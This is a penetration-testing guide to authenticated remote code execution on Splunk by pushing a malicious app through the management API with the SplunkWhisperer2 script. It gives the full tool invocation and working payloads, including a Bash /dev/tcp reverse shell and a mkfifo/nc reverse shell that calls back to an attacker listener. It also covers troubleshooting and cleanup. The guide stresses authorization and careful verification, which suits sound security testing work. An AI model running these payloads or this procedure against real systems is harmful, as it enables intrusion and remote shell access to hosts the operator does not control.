# Authenticated remote app installation and execution

Use the reviewed Python remote script on an authorized Splunk instance. Require permission to install/remove its test app and execute the selected command, not just read the API. Select the credential/account from the current evidence; a password reused on Linux may be a hypothesis for a Splunk login, not proof the two directories are shared. Reachability, authentication, app-management authority and service OS identity are separate conditions.

## Choose the actual endpoint and callback route

8089 commonly identifies the HTTPS management API, while other Splunk services use other ports; verify the protocol/product response. If a local shell is available, identify the live splunkd process with `ps -e` or an explicit PID snapshot such as `ps -ww -p "$pid" -o pid=,euid=,ruid=,args=`. The `splunk` account's presence in passwd does not prove the service runs as it. Avoid mixed `ps -aux` option semantics. Process snapshots and banners are leads; an executed identity result is stronger.

UF 9.1+ management mode commonly uses a local Unix socket or localhost TCP; upgrades can preserve prior settings. Absence of externally reachable TCP is an applicability result, not permission to expose a management port. A Splunk HTTP banner does not uniquely identify a UF or establish an exploitable build. This technique exercises authorized app/script functionality under the observed configuration rather than a universal unauthenticated vulnerability.

The upstream script's consequential options are:

| Option | Meaning / choice |
|---|---|
| `--host`, `--port`, `--scheme` | Selected management destination; defaults are HTTPS and 8089. |
| `--username`, `--password` | Selected Splunk credential. Omitting them selects historical defaults; pass explicit values. |
| `--lhost`, `--lport` | Local HTTP bind address/port serving the bundle and the address advertised to Splunk; default port 8181. The target must connect back to this route. |
| `--payload`, `--payload-file` | Script contents and its app `bin/` filename. The defaults are Windows-oriented; choose target-compatible Linux content/extension. |

Because `--lhost` is also the bind address, `0.0.0.0` is not a useful advertised destination and a remote NAT address not assigned locally cannot bind. Choose a directly reachable local address or an established route that fits both functions; management reachability does not prove reverse HTTP reachability. The bundle server is unencrypted HTTP, so restrict it to the permitted route/lifetime. Source `requests` disables TLS certificate verification: use this only with the established target endpoint, and do not interpret successful connection as verified peer identity.

## Execute a selected script and verify its effect

Define `target`, `management_port`, `bind_ip`, `bundle_port` and `splunk_user` from the task, and `splunk_password` as the selected private value. Its command-line password argument can appear in process records; keep transcripts private and avoid shell history containing literal secrets. This script has no documented password-file flag. Define `python_bin`/`tool` as the existing reviewed interpreter/script and a fresh private `tool_log`.

For a Linux identity result, explicitly select a shell script rather than the default `.bat` file:

~~~bash
payload=$'#!/bin/sh\nid\n'
"$python_bin" "$tool" --host "$target" --port "$management_port" \
  --scheme https --lhost "$bind_ip" --lport "$bundle_port" \
  --username "$splunk_user" --password "$splunk_password" \
  --payload-file identity.sh --payload "$payload" >"$tool_log" 2>&1
~~~

The upstream HTTP requests have no explicit timeout, and the bundle server/input prompt can also keep the process running. Track it under the task's total runtime budget while reading the log from another controlled session; interruption is not rollback. Redirecting output does not remove the later `Press RETURN to cleanup` input requirement. The tool packages `_PWN_APP_` with a scripted input scheduled every 60 seconds, then asks the API to install it. Confirm that name is not an existing unrelated app: the request uses update semantics and could replace it. Use a reviewed task-specific-name adaptation if a collision exists; do not overwrite a production app to reproduce a walkthrough.

Scripted inputs run as the service's OS account and send their stdout toward Splunk indexing, not directly back to this CLI. The successful install line does not return `id` output. Correlate a uniquely identified result through the authorized Splunk data/log evidence or a selected owned artifact/channel. A one-line `id` can be an execution probe, but without that result the conclusion remains installation only. The shebang/filename adaptation is for Unix script execution; Windows payloads and interpreter availability need different content.

If the requested test includes an interactive callback, select the reviewed target shell and listener first. For a verified Bash target, this is a task-specific alternative payload, after defining numeric `callback_ip` and `callback_port`:

~~~bash
payload=$(printf '#!/bin/bash\nbash -i >& /dev/tcp/%s/%s 0>&1\n' \
  "$callback_ip" "$callback_port")
~~~

Pass that value to the same invocation with a Linux filename such as `callback.sh`. Command substitution discards trailing newlines; that is acceptable for this two-line script, not arbitrary binary content. The source also demonstrates a POSIX-shell/FIFO/nc alternative where Bash TCP redirections are unavailable: create a fresh private FIFO, feed `sh -i` from it, pipe combined output to nc and send received bytes back to the FIFO. Do not delete/reuse a fixed `/tmp/f`; a collision or blocked open is a separate filesystem problem. For that alternative, define `target_fifo` as a fresh absolute name in a known owned private directory on the target. For this formatter, require a simple path without shell expansion/quote characters and numeric callback values; the substitution builds script source, not data arguments. With the target's verified POSIX shell and nc:

~~~bash
payload=$(printf '#!/bin/sh\nmkfifo -m 600 -- "%s" && /bin/sh -i <"%s" 2>&1 | nc -n "%s" "%s" >"%s"\n' \
  "$target_fifo" "$target_fifo" "$callback_ip" "$callback_port" "$target_fifo")
~~~

The receiver must support sending commands, not just recording bytes. FIFO opens can wait for their companion; a failed creation is a reason to inspect the selected path, not delete an existing file. After stopping the owned shell/transport, remove only that task-created FIFO through the authorized target context. Either callback exposes the service's existing authority, needs a separately reachable listener and does not create a PTY. Record numeric `id` in the resulting session rather than inferring root from a prompt.

## Interpret intermediate failures and complete cleanup

| Observation | Interpretation / next decision |
|---|---|
| HTTP 401 / Unauthorized | Selected authentication was rejected. Historical default rejection can also involve remote-login policy; it does not prove the password was changed. Inspect the endpoint/policy and candidate evidence. |
| GET 403, 404 or another non-401 response followed by `Authenticated` | Source only treats 401 as an authentication failure. Its message is not a sufficient login result; examine status/body and correct the endpoint/authority. |
| Install POST not 200/201, then `App installed` | The script still prints success after reporting an error. Treat this as failed/uncertain installation; inspect the actual response and app state. |
| Install accepted, no execution result | Check scripted-input loading, target interpreter, service permissions, output/index diagnostics and timing. Installation is distinct from executed code. |
| No bundle GET / bind error | Separate local bind, target-to-worker routing, filtering and download failure from credential success. Repeating authentication does not repair this path. |
| Callback received, identity absent or limited | Transport occurred; verify command/identity in that session. Root is neither required for the tool nor guaranteed by it. |

App installation permissions depend on role and configuration; current Splunk documents different capability requirements according to `enable_install_apps`. Valid credentials alone need not permit this action. A timeout/interruption leaves effects uncertain; inspect the test app/process before another install. Script scheduling can repeat or leave a long-running child, so retain its lifetime and actual side effects.

After capturing the requested result, end the owned callback/child and use the script's RETURN prompt. The tool removes its local bundle, requests DELETE for `_PWN_APP_` and stops the bundle HTTP server. It also prints `App removed` after a DELETE error: inspect that response and verify the named app/owned processes are gone through the authorized management/local context. API removal does not prove already spawned descendants exited; process termination does not prove app removal. Do not stop the entire service as automatic cleanup. Record unresolved cleanup and remove only task-owned residuals through a separately authorized operation.

Finish with endpoint/revision, selected authentication result, app-install outcome, actual execution/UID evidence and cleanup status. If only one stage is evidenced, report that partial result without inventing a shell or escalating the claim.

Primary sources: [remote script](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py), [author's mode/default-policy explanation](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/), [app endpoints and capabilities](https://help.splunk.com/en/splunk-enterprise/leverage-rest-apis/rest-api-reference/9.3/application-endpoints/application-endpoint-descriptions), [UF management modes](https://help.splunk.com/en/splunk-enterprise/forward-and-process-data/universal-forwarder-manual/9.4/working-with-the-universal-forwarder/about-management-mode-for-the-universal-forwarder), [Unix scripted inputs](https://help.splunk.com/en/splunk-enterprise/get-started/get-data-in/10.0/get-other-kinds-of-data-in/get-data-from-apis-and-other-remote-data-interfaces-through-scripted-inputs).
